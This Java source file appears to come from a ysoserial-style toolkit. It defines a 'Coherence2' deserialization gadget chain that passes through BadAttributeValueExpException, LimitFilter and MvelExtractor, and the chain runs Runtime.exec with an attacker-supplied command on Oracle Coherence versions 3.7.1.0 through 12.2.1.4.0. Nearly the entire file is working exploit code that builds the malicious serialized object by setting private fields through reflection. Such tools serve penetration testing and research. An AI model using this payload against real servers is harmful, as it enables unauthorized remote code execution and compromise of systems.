package payloads;

import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.util.filter.LimitFilter;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

/*
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.coherence.rest.util.extractor.MvelExtractor;
 */

@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0"})
@Authors({ Authors.CCKUAILONG })
public class Coherence2 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		MvelExtractor mvelExtractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+command+"\")");
		//初始化LimitFiler类实例
		LimitFilter limitFilter = new LimitFilter();
		limitFilter.setTopAnchor(Runtime.class);
		BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
		Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
		m_comparator.setAccessible(true);
		m_comparator.set(limitFilter, mvelExtractor);
		Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
		m_oAnchorTop.setAccessible(true);
		m_oAnchorTop.set(limitFilter, Runtime.class);
		//将limitFilter放入BadAttributeValueExpException的val属性中
		Field val = expException.getClass().getDeclaredField("val");
		val.setAccessible(true);
		val.set(expException, limitFilter);

		return expException;
	}

	public static byte[] getBytes(final String command) throws Exception {
		return PayloadRunner.run(Coherence2.class, command);
	}

	public static void main(final String command) throws Exception {
		PayloadRunner.run(Coherence2.class, command);
	}

}
